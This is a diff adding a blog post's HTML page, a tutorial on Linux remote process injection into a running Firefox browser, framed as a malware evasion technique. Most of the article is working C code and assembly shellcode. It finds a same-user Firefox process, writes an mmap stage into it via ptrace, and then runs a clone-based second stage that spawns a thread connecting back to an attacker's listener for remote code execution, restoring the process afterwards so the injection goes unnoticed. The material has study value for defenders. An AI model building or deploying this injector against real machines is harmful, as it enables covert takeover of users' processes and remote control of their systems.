@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Linux Remote Process Injection: (Injecting into a Firefox Browser Process) | BinaryChunk’s Blog</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Linux Remote Process Injection: (Injecting into a Firefox Browser Process)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This blog will cover Remote Process Injection in Linux; a common evasion technique popular in the Windows Malware world. The aim will be to write an injector that injects into another remote process and for the purpose of this blog, the chosen victim process will be Firefox." />
+<meta property="og:description" content="This blog will cover Remote Process Injection in Linux; a common evasion technique popular in the Windows Malware world. The aim will be to write an injector that injects into another remote process and for the purpose of this blog, the chosen victim process will be Firefox." />
+<link rel="canonical" href="http://0.0.0.0:4000/2023/10/04/Linux-Remote-Process-Injection.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2023/10/04/Linux-Remote-Process-Injection.html" />
+<meta property="og:site_name" content="BinaryChunk’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-04T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Linux Remote Process Injection: (Injecting into a Firefox Browser Process)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-10-04T00:00:00+00:00","datePublished":"2023-10-04T00:00:00+00:00","description":"This blog will cover Remote Process Injection in Linux; a common evasion technique popular in the Windows Malware world. The aim will be to write an injector that injects into another remote process and for the purpose of this blog, the chosen victim process will be Firefox.","headline":"Linux Remote Process Injection: (Injecting into a Firefox Browser Process)","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/2023/10/04/Linux-Remote-Process-Injection.html"},"url":"http://0.0.0.0:4000/2023/10/04/Linux-Remote-Process-Injection.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="BinaryChunk&apos;s Blog" />
+
+<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
+<style>
+@font-face {
+  font-family: 'Open Sans';
+  src: url('//fonts.gstatic.com/s/opensans/v44/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4kaVIGxA.woff2')
+       format('woff2');
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+  font-stretch: 100%;
+}
+
+body {
+  font-family: 'Open Sans', sans-serif;
+  font-size: 11pt;
+}
+</style>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">BinaryChunk&#39;s Blog</a>
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon"></span>
+        </label>
+
+        <div class="nav-items">
+  <a class="nav-item" href="/ctfs/">CTFs</a>
+</div>
+
+      </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Linux Remote Process Injection: (Injecting into a Firefox Browser Process)</h1>
+    <div class="post-meta">
+      <time class="dt-published" datetime="2023-10-04T00:00:00+00:00" itemprop="datePublished">
+        Oct 4, 2023
+      </time>
+    </div>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This blog will cover <strong>Remote Process Injection</strong> in Linux; a common evasion technique popular in the Windows Malware world. The aim will be to write an injector that injects into another remote process and for the purpose of this blog, the chosen victim process will be <strong>Firefox</strong>.</p>
+
+<p>For a simple <strong>Windows Process Injection</strong> technique, a process is somewhat able to map a new memory on behalf of another remote process via <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> and has the ability to read and write into this memory region and at the same time have the ability to create a thread that will run in the context of that remote process via <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>.</p>
+
+<p><strong>Linux Process Injection</strong> is completely different in that we aren’t provided with such interesting APIs <em>(I bet this is mentioned alot in other blog posts)</em>. In this post we will emulate the behaviour of the above mentioned Windows Process Injection technique by combining <code class="language-plaintext highlighter-rouge">ptrace</code>, <code class="language-plaintext highlighter-rouge">mmap</code> and the <code class="language-plaintext highlighter-rouge">clone</code> system calls to inject into a live Firefox Process.</p>
+
+<p>The <strong>usage</strong> and <strong>knowledge</strong> of the <code class="language-plaintext highlighter-rouge">ptrace</code> system call for simple code injection is needed but not required. A detailed description is as provided <a href="https://mutur4.github.io/posts/linux-malware-development/process-injection">here</a></p>
+
+<h3 id="process-enumeration">Process-Enumeration</h3>
+
+<p><strong>Process Enumeration</strong> is key in process injection since we want to find a suitable process where we can inject our code. This is helpful in finding a process owned by us <em>(same uid)</em> and also having a fail-safe when an injection into another process fails.</p>
+
+<p>Linux Processes can be enumerated by parsing the <code class="language-plaintext highlighter-rouge">/proc</code> directory and looking for ‘numbered’ directories. For example, a process with  pid of <code class="language-plaintext highlighter-rouge">1337</code> will have its information stored at <code class="language-plaintext highlighter-rouge">/proc/1337/</code>.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">UID</code> of the user that owns the process is stored in the <code class="language-plaintext highlighter-rouge">/proc/&lt;PID&gt;/status</code> file as shown for an example process below.</p>
+
+<p><img src="https://i.imgur.com/qlZIWWl.png" alt="Process UID" /></p>
+
+<p>The following <code class="language-plaintext highlighter-rouge">C</code> code snippet will enumerate all processes to check for a valid <strong>Firefox</strong> process that shares the same <code class="language-plaintext highlighter-rouge">UID</code> as the injecting process <code class="language-plaintext highlighter-rouge">getuid()</code>. The information about this process is stored in a struct variable that will come in handly later when we initiate code injection.</p>
+
+<blockquote>
+  <p>The code snippet below is compatible in that it can be modified to inject into any chosen process of your chosing other than Firefox or automatically left to inject into a random(ly) chosen process that shares the same <code class="language-plaintext highlighter-rouge">UID</code> as the injector.</p>
+</blockquote>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PPROCESS</span> <span class="nf">enumProcs</span><span class="p">(){</span>
+        <span class="n">PPROCESS</span> <span class="n">head</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+        <span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="n">opendir</span><span class="p">(</span><span class="s">"/proc"</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">dir</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+
+        <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">e</span><span class="p">;</span>
+
+        <span class="c1">//This is used to return all the live processes (PIDz)</span>
+        <span class="k">while</span><span class="p">((</span><span class="n">e</span><span class="o">=</span><span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">atoi</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">)</span> <span class="o">||</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">d_type</span> <span class="o">!=</span> <span class="n">DT_DIR</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+                <span class="c1">//Determine the owner of the process and compare this to ours</span>
+
+                <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="n">CMDLINESZ</span><span class="p">];</span>
+                <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">"/proc/%s/status"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
+
+                <span class="c1">//read this file to find the process id </span>
+
+                <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">CMDLINESZ</span> <span class="o">*</span> <span class="mi">2</span><span class="p">];</span>
+
+                <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
+
+                <span class="kt">int</span> <span class="n">readsz</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+
+                <span class="k">if</span><span class="p">(</span><span class="n">readsz</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+                <span class="kt">char</span> <span class="o">*</span><span class="n">needle</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">DELIM</span><span class="p">);</span>
+                <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">strtok</span><span class="p">(</span><span class="n">needle</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">DELIM</span><span class="p">),</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">));</span>
+
+                <span class="c1">//if this process is not owned by us; continue to the next process</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">getuid</span><span class="p">())</span> <span class="k">continue</span><span class="p">;</span>
+
+                <span class="n">memset</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">));</span> <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+                <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">"/proc/%s/cmdline"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
+
+                <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="p">}</span>
+
+                <span class="n">readsz</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">readsz</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+
+                <span class="c1">//This is option used to search for a specific process in memory</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"firefox"</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+                <span class="n">PPROCESS</span> <span class="n">process</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPROCESS</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS</span><span class="p">));</span>
+                <span class="n">memset</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS</span><span class="p">));</span>
+
+                <span class="k">if</span><span class="p">(</span><span class="n">process</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+
+                <span class="c1">//copy the details in memory</span>
+                <span class="n">process</span><span class="o">-&gt;</span><span class="n">pid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
+                <span class="n">strncpy</span><span class="p">(</span><span class="n">process</span><span class="o">-&gt;</span><span class="n">proc_name</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">CMDLINESZ</span><span class="p">);</span>
+
+                <span class="c1">//initiate process injection</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">processInject</span><span class="p">(</span><span class="n">process</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+                        <span class="n">free</span><span class="p">(</span><span class="n">process</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span>
+                <span class="p">}</span>
+
+                <span class="n">head</span> <span class="o">=</span> <span class="n">process</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">head</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="address-space-enumeration">Address-Space Enumeration</h3>
+
+<p>After a suitable remote process is enumerated and returned <em>(in this case our FireFox Process)</em>, we need to enumerate its <strong>Virtual Address Space</strong> to find an address range that is executable <code class="language-plaintext highlighter-rouge">(rwp)?x</code>. This address is returned by parsing and reading the <code class="language-plaintext highlighter-rouge">/proc/&lt;pid&gt;/maps</code> file.</p>
+
+<blockquote>
+  <p>code-injection happens via <code class="language-plaintext highlighter-rouge">ptrace</code> that does not necessarily need a writable/readable memory block to perform its actions.</p>
+</blockquote>
+
+<p>The following <code class="language-plaintext highlighter-rouge">C</code> source code snippet performs this enumeration and returns an executable address range that is searched via the <code class="language-plaintext highlighter-rouge">strstr</code> function.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PADDRESS</span> <span class="nf">enumAddress</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">){</span>
+        <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">CMDLINESZ</span><span class="p">];</span>
+        <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">perms</span><span class="p">[</span><span class="mh">0x5</span><span class="p">];</span>
+
+        <span class="n">PADDRESS</span> <span class="n">paddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PADDRESS</span><span class="p">)</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">));</span>
+
+
+        <span class="n">snprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="s">"/proc/%d/maps"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] Parsing: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+
+        <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[!] Error Opening: %s</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span> <span class="k">goto</span> <span class="n">end</span><span class="p">;}</span>
+
+        <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+                <span class="n">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"%lx-%*lx %s %*s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">paddr</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">,</span> <span class="n">perms</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">perms</span><span class="p">,</span> <span class="s">"x"</span><span class="p">)){</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
+        <span class="p">}</span>
+
+
+        <span class="k">return</span> <span class="n">paddr</span><span class="p">;</span>
+
+<span class="nl">end:</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="remote-memory-mapping">Remote Memory Mapping</h3>
+
+<p>A new allocated memory map in the <strong>Virtual Address Space</strong> of the remote process is required for the following reasons:</p>
+
+<ul>
+  <li>This will pevent overwriting existing data in the memory of the remote process that could affect the proper execution of that remote process.</li>
+  <li>An <strong>executable</strong> page for code injection with no length restrictions limiting the second-staged payload (shellcode).</li>
+</ul>
+
+<p>For the allocation of this page, we need a first <em>stage-payload</em> that will be executed by the remote process to allocate memory. The executable page/memory returned by the above <code class="language-plaintext highlighter-rouge">enumAddress</code> function will be used for the execution of the following shellcode that uses <code class="language-plaintext highlighter-rouge">mmap</code> to map a new <code class="language-plaintext highlighter-rouge">RWX</code> page.</p>
+
+<pre><code class="language-asm">push 0x22
+pop rcx
+
+push 0xffffffffffffffff
+pop r8
+
+xor r9d, r9d;
+xor esi, esi
+xor rdi, rdi
+
+push 0x7
+pop rdx
+
+mov esi, 0x01010101
+xor esi, 0x01010101
+
+push 0x9
+pop rax
+
+syscall ; mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset)
+int3 ; Raise a SIGTRAP signal 
+</code></pre>
+
+<blockquote>
+  <p>The above shellcode was written in a region that obviously had existing data and since we do not want to disrupt normal execution of the remote Firefox Process, we will create a backup and copy it back after the first stage-payload is done with execution.</p>
+</blockquote>
+
+<p>The above shellcode is written to the returned address and the <code class="language-plaintext highlighter-rouge">rip</code> register is modified to point to this address for code execution. The <code class="language-plaintext highlighter-rouge">int3</code> instruction added at the end of the above shellcode is used as a trigger to let us know that our shellcode was succesfully executed. This is because of a returned <code class="language-plaintext highlighter-rouge">SIGTRAP</code> signal a technique described at [1].</p>
+
+<p>The following code snippet performs the process described above.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">PADDRESS</span> <span class="n">address</span> <span class="o">=</span> <span class="n">enumAddress</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+
+
+        <span class="c1">//Read OLD data from the return address above</span>
+        <span class="n">dataRead</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">backup</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">remote_mmap</span><span class="p">));</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Data backup complete!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+        <span class="c1">//shellcode injection into this address.</span>
+        <span class="n">dataWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">remote_mmap</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">remote_mmap</span><span class="p">));</span>
+
+        <span class="c1">//update RIP to point to our 'shellcode'</span>
+
+        <span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">;</span>
+
+        <span class="c1">//set registers to the new registers</span>
+        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+
+        <span class="c1">//continue execution</span>
+        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="n">WUNTRACED</span><span class="p">);</span>
+
+		<span class="c1">//Wait for the SIGTRAP signal and check `rax` for the mapped page</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGTRAP</span><span class="p">){</span>
+                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Mmap() execution was success!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+                <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+		
+				<span class="k">if</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">rax</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+		
+                <span class="n">address</span><span class="o">-&gt;</span><span class="n">mmaped_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">regs</span><span class="p">.</span><span class="n">rax</span><span class="p">;</span>
+                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] mmap'd address: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">mmaped_address</span><span class="p">);</span>
+
+                <span class="k">goto</span> <span class="n">shellcodeExec</span><span class="p">;</span>
+
+        <span class="p">}</span>
+</code></pre></div></div>
+<p>The memory address of the newly allocated <code class="language-plaintext highlighter-rouge">(RWX)</code> region is returned to be used in the second-stage payload.</p>
+
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+
+<p>The second-staged payload <em>(emulating <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>)</em> can now be written into the newly allocated page for execution. The aim was to come up with a shellcode that would not affect the execution of the remote process at all cost and should be able to run as its own separate <strong>process</strong> or <strong>thread</strong>.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">clone</code> syscall is interesting because it can be used to implement both <code class="language-plaintext highlighter-rouge">threads</code> <em>(light-weight processes)</em> and <em>child processes</em> based on arguments pass to it <em>i.e</em> <code class="language-plaintext highlighter-rouge">CLONE_VM</code>.</p>
+
+<p>The following is part of the shellcode used to emulate <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> by spawning a remote thread that connect’s back to an attacker’s machine for <strong>Remote Code Execution</strong>.</p>
+
+<pre><code class="language-asm">xor rdi, rdi;
+or rdi, 0x800100 ;CLONE_UNTRACED | CLONE_VM
+
+xor rsi, rsi
+xor rdx, rdx
+xor rcx, rcx
+xor r8, r8
+
+push 0x38
+pop rax
+syscall; clone(unsigned long clone_flags, unsigned long newsp, void *parent_id, void *child_tid, unsigned int tid)
+	
+cmp rax, 0x0
+je &lt;Connect-Back Shellcode address&gt; ;JMP to connect-back shellcode
+int3 ;raise a SIGTRAP
+...
+</code></pre>
+<p>When the above shellcode is executed, the spawned thread <em>(that see’z a PID of <code class="language-plaintext highlighter-rouge">0</code>)</em> will execute the connect back shellcode connecting to <code class="language-plaintext highlighter-rouge">localhost:1337</code>. On the other hand, the parent proccess will raise a <code class="language-plaintext highlighter-rouge">SIGTRAP</code> letting us know that shellcode execution was a success, therefore allowing us to restore the back’d up data and resume execution of the remote process from <em><strong>ptrace’s</strong></em> <code class="language-plaintext highlighter-rouge">SIGSTOP</code>.</p>
+
+<p>The following is the source code snippet that writes code into the new mmap’d region and returns execution back to the remote process.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">shellcodeExec:</span>
+        <span class="cm">/* ----- Write and Execute shellcode stored in the newly mmap'd region ----*/</span>
+        <span class="n">dataWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">mmaped_address</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+
+        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">regs</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_regs_struct</span><span class="p">));</span>
+
+        <span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">mmaped_address</span><span class="p">;</span>
+
+        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] Shellcode Execution @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">);</span>
+        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+        <span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+        <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="n">WUNTRACED</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">WIFSTOPPED</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">WSTOPSIG</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIGTRAP</span><span class="p">)</span> <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+
+
+<span class="n">cleanup</span><span class="o">:</span>
+        <span class="n">dataWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">address</span><span class="o">-&gt;</span><span class="n">start_address</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">backup</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">remote_mmap</span><span class="p">));</span>
+
+        <span class="c1">//Restore Registers and execution back to the remote process</span>
+
+        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">);</span>
+        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+</code></pre></div></div>
+
